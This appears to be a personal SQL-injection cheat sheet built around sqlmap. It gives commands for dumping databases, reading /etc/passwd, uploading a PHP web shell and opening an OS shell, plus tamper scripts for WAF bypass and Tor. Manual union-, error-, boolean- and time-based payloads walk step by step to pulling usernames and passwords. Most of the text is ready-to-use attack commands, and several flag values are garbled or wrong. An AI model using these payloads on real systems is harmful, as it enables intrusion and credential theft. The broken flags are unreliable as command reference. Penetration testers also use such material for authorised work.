# SQLi


tools: SQLmap

wordlists:

[raw.githubusercontent.com/0xmaximus/Galaxy-Bugbounty-Checklist/main/SQL injection/SQL.txt](https://raw.githubusercontent.com/0xmaximus/Galaxy-Bugbounty-Checklist/main/SQL%20injection/SQL.txt)

resources:

[https://techyrick.com/sqlmap-full-tutorial/](https://techyrick.com/sqlmap-full-tutorial/)

[https://medium.com/@cuncis/the-ultimate-sqlmap-tutorial-master-sql-injection-and-vulnerability-assessment-4babdc978e7d](https://medium.com/@cuncis/the-ultimate-sqlmap-tutorial-master-sql-injection-and-vulnerability-assessment-4babdc978e7d)

[https://medium.com/@tushar_rs_/sqlmap-a-comprehensive-guide-to-sql-injection-testing-37220e77b0ee](https://medium.com/@tushar_rs_/sqlmap-a-comprehensive-guide-to-sql-injection-testing-37220e77b0ee)

[https://github.com/sqlmapproject/sqlmap/issues/4142](https://github.com/sqlmapproject/sqlmap/issues/4142)

[https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)

[https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3](https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3)

---

First you need to reconize what, dababase service is runnning behind the site

- check errors and response and try gather information and look for any FingerPrint ups to any database or not. for making progress easier
- check with autorepeater and logger++ methodology.

---

### Commands

[`sqlmap.py](http://sqlmap.py/) -u $1 --batch --random-agent --tamper=space2comment --level 4 --risk 3 --technique=T`

**From File**

```bash
sqlmap -r request.txt
```

**Testing with pattern of URL’s**

```bash
sqlmap -u http://example.com/page/*/view --dbs
```

**Extract Databases (DB Enumeration)**

```bash
sqlmap -u http://example.com/page.php?id=1 --dbs
```

**Extract Tables**

```bash
sqlmap -u http://example.com/page.php?id=1 -D database --tables
```

**Extract Columns**

```bash
sqlmap -u http://example.com/page.php?id=1 -D database -T table_name --columns
```

**Dumping Data**

```bash
sqlmap -u http://example.com/page.php?id=1 -D database -T table_name -C colum1,column2 --dump
```

**Multithreading**

```bash
sqlmap -u http://example.com/page.php?id=1 --dbs --threads 5
```

**Reading Files from the server**

```bash
sqlmap -u http://example.com/page.php?id=1 --file-read=/etc/passwd
```

**Checking privilages**

```bash
sqlmap -u http://example.com/page.php?id=1 --privileges
```

**Reading Files from the server**

```bash
sqlmap -u http://example.com/page.php?id=1 --file-read=/etc/passwd
```

**Uploading Files/Shell**

```bash
sqlmap -u http://example.com/page.php?id=1 --file-write=/root/shell.php --file-dest=/var/www/shell.php
```

**SQL Shell**

```bash
sqlmap -u http://example.com/page.php?id=1 --sql-shell
```

**OS shell**

```bash
sqlmap -u http://example.com/page.php?id=1 --os-shell
```

**OS Command Exe without Shell Upload**

```bash
sqlmap -u http://example.com/page.php?id=1 --os-cmd "uname -a"
```

**Crawling**

```bash
sqlmap -u http://example.com/ --crawl=1
```

**Scanning with High Risk and Level**

```bash
sqlmap -u http://example.com/page.php?id=1 **--level=3 --risk=5**
```

- **‘-u’**: Specifies the target URL of the web application to be tested.**‘-p’**: Specifies the parameter to be tested for SQL injection.**‘- - data’**: Specifies the data string to be sent through a POST request.**‘- -cookie’**: Specifies the cookie string to be used for the HTTP request.**‘- - dbms**’: Specifies the DBMS (Database Management System) to be targeted, such as MySQL, Oracle, or Microsoft SQL Server.
- Scan Commands**‘- -level’**: Specifies the level of tests to be performed. The default level is 1,
and you can increase the level up to 5 for more comprehensive tests.**‘- - risk’**: Specifies the level of risk for the target. The default value is 1, and you can increase the value up to 3 for more sensitive targets.**‘- - threads’**: Specifies the number of threads to be used for the scan. The default
value is 1, and you can increase the value for faster scans.
- **Exploit Commands‘- - dump’**: Dumps the contents of the database, table, or column specified in the command.**‘- - os-shell’**: Executes operating system commands on the target machine. **‘- - sql-shell’**: Gives an interactive SQL shell on the target database.**‘- - file-read’**: Reads files from the target machine.**‘- - file-write’**: Writes files to the target machine.
- **Output Commands‘-o’**: Specifies the output file for the scan result. The output can be saved in various formats, such as text, XML, or HTML.**‘- -flush-session’**: Deletes the current session file.**‘- - save’**: Saves the current session to a file.**‘- - load’**: Loads a saved session from a file.
- **Advanced Commands‘- - technique’**: Specifies the injection technique to be used, such as UNION-based, error-based, or time-based injection.**‘- - tamper’**: Specifies a script to modify the SQL injection payloads sent by SQLMap.**‘- - random-agent’**: Specifies a random user-agent string for the HTTP request.**‘- - tor’**: Specifies the use of the Tor network for anonymous scanning.

---

# My Self Metho

### **GET request - specail parameter test**

for the situation you had to test special parameter like uuid or mont= 

use -p flag

```bash
**sqlmap -u http://192.168.149.137/admin/login.php?mon=06 -p mon**
```

- u: Target
- p: parameter to scan for

---

### post request

**for the situation you may have enter user pass**

```bash
**sqlmap -u http://192.168.149.137/admin/login.php –data=”user=admin&password=admin” –dbs**
```

- u: Target

–data: data string sent through a post (eg: id =1)

–dbs: database enumerating

---

### batch

**the —batch value use for the question that sqlmap ask you every fucking move.**

---

### Threads

—threads=1to5

```bash
**sqlmap -u <target> –threads=1to5**
```

---

### TOR

scaning with tor

—tor 

```bash
**sqlmap -u <target> <optional arfuements> –tor**
```

---

### risks

how much critical payload may sqlmap had to use?

```bash
**sqlmap -u <target> <optional arguments> –risk=1to3**
```

---

### verbose mode - read easier

You can enter 1 to 6 for verbose.

```bash
**sqlmap -u <target> <optional argument> -v “2”**
```

---

### modify header and add header to sqlmap request

—headers flag

```bash
sqlmap -u <target URL> --headers="User-Agent: Mozilla/5.0"
```

```bash
sqlmap -u <target URL> --headers="Origin:blab"
```

—cookie

```bash
sqlmap -u <target URL> --cookie="PHPSESSID=12345"
```

`--cookie-file` → load cookies file → usefull for bypassing WAF and reusing previouse sessions

```jsx
sqlmap -u 'https://studentportal.elfu.org/application-check.php?elfmail=buddytheelf%27OR1%3D1%23%40thenorthpole.com&token=MTAxMzMxMjgyODE2MTU4MzMwMTI5NDEwMTMzMTI4Mi44MTY%3D_MTI5NzA0MDQyMDA0NDgzMjQyNjAxMDUwLjExMg%3D%3D' --dump
```

```jsx
python3 [sqlmap.py](http://sqlmap.py/) -u '[https://target.com/Employee/CutEmployees/14020603?st=1](https:///example.comEmployee/CutEmployees/14020603?st=1)' --headers="Cookie: _ga46c8c7f73270e095" --batch --random-agent -p st,y,m -treads 1 -risk 3 -v 6 --technique=BEUSTQ
```

---

### Data

In a GET request:

```
$ sqlmap -u "http://example.com/?a=1&b=2&c=3" -p "a,b"

```

In a POST request:

```
$ sqlmap -u "http://example.com/" --data "a=1&b=2&c=3" -p "a,b" --method POST
...
[13:37:54] [WARNING] heuristic (basic) test shows that POST parameter 'a' might not be injectable
...
[13:37:59] [WARNING] heuristic (basic) test shows that POST parameter 'b' might not be injectable
...

```

Both examples would test the specified parameters `a` and `b`, but ignore `c`. (I also put them into double quotes which isn't actually necessary on Linux.)

---

### tamper

the tamper parameters its just some python script for Doing some bypass or specific works like decoding and ecncoding parameters.

- -tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper

some usefull tamper scripts:

### apostrophemask.py

**Function: Encoding quotation marks with utf8**

**Platform: All**

> example
> 

1 AND ‘1’=’1 ==> 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871

### **apostrophenullencode.py**

**Function: ‘ ==> %00%27**

**Platform: All**

> example
> 

1 AND ‘1’=’1 ==> 1 AND %00%271%00%27=%00%271

### base64encode.py

**Function: base64 encode**

**Platform: All**

> example
> 

1' AND SLEEP(5)# ==> `MScgQU5EIFNMRUVQKDUpIw==`

### charencode.py

**Function: url encoding**

**Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0**

> example
> 

SELECT FIELD FROM%20TABLE ==> %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45

### charunicodeencode.py

**Function: escape code**

**Platform: Mssql 2000,2005、MySQL 5.1.56、PostgreSQL 9.0.3 ASP/ASP.NET**

> example
> 

SELECT
 FIELD%20FROM TABLE ==> 
%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045

### percentage.py

**Function: select ==> s%e%l%e%c%t**

**Platform: Mssql 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0**

> example
> 

SELECT FIELD FROM TABLE ==> %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E

### randomcase.py

**Function: INSERT ==> INseRt**

**Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0**

> example
> 

INSERT ==> InseRt

### randomcomments.py

**Function: INSERT ==> I/**/N/**/SERT**

**Platform: Mysql**

> example
> 

INSERT ==> I / ** / N / ** / SERT

### varnish.py

**Function: header**

> example
> 

X-originating-IP: 127.0.0.1

### xforwardedfor.py

**Function: X-Forwarded-For Random Head**

**Platform: All**

> example
> 

X-Forwarded-For: 127.0.0.1

---

### use random user agents for bypassing waf

`--random-agent`

---

### technique

**‘- - technique’**: Specifies the injection technique to be used, such as UNION-based, error-based, or time-based injection.

- B: Boolean-based blind

- E: Error-based

- U: Union query-based

- S: Stacked queries

- T: time-based blind

- Q: Inline queries

`--technique=BEUSTQ` → for select all

---

### csrf_token & csrf_url

---

### 2 requests

now can we pass a second request to sqlmap beside one request???

Do this:

sqlmap -r login.txt  --second-req second.txt

or if you have another url do this:
sqlmap -r login.txt  --second-url "[http://10.10.10.10/details.php](http://10.10.10.10/details.php)"

---

**Sql Injection**

```
SELECT title,body,date FROM news WHERE id=''
```

```
$username = admin' or 1=1 --

SELECT * FROM users WHERE username='$username' AND password=''
```

**Boolean Based Discovery**

```
XXXXX and 1=1--+
XXXXX and 1=2--+

XXXXX and 1/2=1/2--+
XXXXX and 1/2=1/3--+

XXXXX and 1 like 1--+
XXXXX and 1 like 2--+
```

**Time Based Discovery**

Mysql

```
and sleep(10)--+

```

MSSQL

```
and waitfor delay "00:00:10"--+

```

**Error Based Discovery**

Request:

```
show_news.aspx?news_id=2'

```

Response:

```
 Unclosed quotation mark after the character string ''.

```

**Union Based Discovery Payloads**

- `'`
- `"`
- `\`

**Union Based Exploitation**

**Step 1: Current table column count**

- show_news?news_id=2' order by 30--+
- show_news?news_id=2' order by 15--+
- show_news?news_id=2' order by 7--+
- show_news?news_id=2' order by 6--+

**Found: `6 columns`**

**Step 2: Finding columns that shows to us**

```
show_news?news_id=-2' union select 1,2,3,4,5,6 --+
show_news?news_id=-2' union select 1,version(),3,4,5,6 --+
show_news?news_id=-2' union select 1,database(),3,4,5,6 --+

```

**Step #3: Finding database tables**

```
show_news?news_id=-2' union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables WHERE table_schema=database()--+
```

---

**Step 4: Finding database table columns**

```
show_news?news_id=-2' union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns WHERE table_schema=database() and table_name='users'--+
```

---

**Step 5: Finding database table columns**

```
show_news?news_id=-2' union select 1,group_concat(username,0x3a,password),3,4,5,6 from users--+
```

- `0x3a` => `:`

**Error Based Exploitation**

**Extract Database name**

```
?id=4 and 1=db_name()--+

```

```
?id=4 and 1=@@version--+

```

**Table Extraction**

```
?id=4 and 1=(select table_name from information_schema.tables FOR XML PATH)--+
```

```
<row><table_name>Candidate_Details</table_name></row><row><table_name>Job_Details</table_name></row><row><table_name>Candidate_Details</table_name></row><row><table_name>Job_Details</table_name></row><row><table_name>temp_dios_sample</table_name></row><row><table_name>err_dios</table_name></row><row><table_name>admin_login</table_name></row>
```

**Table Column Extraction**

```
?id=4 and 1=(select column_name from information_schema.columns where table_name='admin_login' FOR XML PATH)--+
```

```
<row><column_name>Id</column_name></row><row><column_name>admin_id</column_name></row><row><column_name>admin_pwd</column_name></row>
```

**Extracting Data**

```
?id=4 and 1=(select admin_id,admin_pwd from admin_login FOR XML PATH)--+
```